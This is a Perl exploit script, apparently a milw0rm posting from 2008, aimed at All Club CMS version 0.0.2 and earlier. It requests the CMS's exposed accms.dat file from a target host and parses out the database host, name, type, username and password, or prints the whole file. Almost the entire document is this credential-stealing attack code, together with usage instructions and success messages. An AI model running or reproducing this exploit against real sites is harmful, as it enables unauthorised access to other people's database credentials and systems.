#!/usr/bin/perl 

=about

 All Club CMS <= 0.0.2 Remote DB Config Retrieve Exploit
 -------------------------------------------------------
 by athos - staker[at]hotmail[dot]it
 download on http://sourceforge.net
 -------------------------------------------------------
 Usage: perl exploit.pl localhost/cms [MODE]
        perl exploit.pl localhost/cms all 
        perl exploit.pl localhost/cms default    
 -------------------------------------------------------
 NOTE: Don't add me on MSN Messenger
                

=cut

use strict;
use warnings;
use IO::Socket;
use LWP::UserAgent;

my (@conf,$result);

my $host = shift;
my $path = shift;
my $mode = shift or &usage;
my @data = split /=\s/,dbconfig();

die "Exploit Failed!\n" unless(join('',@data) =~ /DB_PASS/i);

if($mode =~ /all/i)
{
   my $http = new LWP::UserAgent(
                                  agent   => 'Lynx (textmode)',
                                  timeout => 5,
                                ) or die $!;  
                              
   my $send = $http->get("http://${host}/${path}/accms.dat");
   
   if($send->is_success)
   {
      print STDOUT $send->content;
      exit;
   }
   else
   {
      print STDERR $send->status_line;
      exit;
   }
}


if($mode =~ /default/i)
{
   $data[9] =~ s/\s/\0/;      # password
   $data[8] =~ s/DB_PASS/\0/; # username
   $data[7] =~ s/DB_USER/\0/; # db host
   $data[6] =~ s/DB_HOST/\0/; # db name
   $data[5] =~ s/DEF_DB/\0/;  # db type

   @conf = (
             'dbhost:'   => $data[7],
             'dbname:'   => $data[6],
             'dbtype:'   => $data[5],
             'username:' => $data[8],
             'password:' => $data[9],
          );                

   foreach(@conf)
   {
      $result .= $_;
   }       

   my $content = join '',split / /,$result;

   if($content =~ /(dbhost|dbname|dbtype|username|password)/i)
   {
      print STDOUT "[-] Exploit Successfully!\n";
      print STDOUT $content;
      exit; 
   }
   else
   {
      print STDOUT "[-] Exploit Failed!\n";
      print STDOUT "[-] by athos - staker[at]hotmail[dot]it\n";
      exit;
   }  
}


sub dbconfig
{
   my $html;
   my $sock = new IO::Socket::INET(
                                    PeerAddr => $host,
                                    PeerPort => 80,
                                    Proto    => 'tcp',
                                  ) or die $!;
                                  
                                     
   my $data = "GET /$path/accms.dat HTTP/1.1\r\n".
              "Host: $host\r\n".
              "User-Agent: Lynx (textmode)\r\n".
              "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n".
              "Accept-Language: en-us,en;q=0.5\r\n".
              "Accept-Encoding: text/plain\r\n".
              "Connection: close\r\n\r\n";
              
   $sock->send($data);
  
   while(<$sock>) 
   { 
      $html .= $_; 
   }  return $html if $html =~ m{HTTP/1.1 200 OK};            
}   
   
   
   
sub usage
{
   print STDOUT "[-] All Club CMS <= 0.0.2 Remote DB Config Retrieve Exploit\n";
   print STDOUT "[-] Usage: perl $0 [host] [path] [mode]\n";
   print STDOUT "           perl $0 localhost /cms all\n";
   print STDOUT "           perl $0 localhost /cms default\n"; 
   exit;
}  

# milw0rm.com [2008-11-28]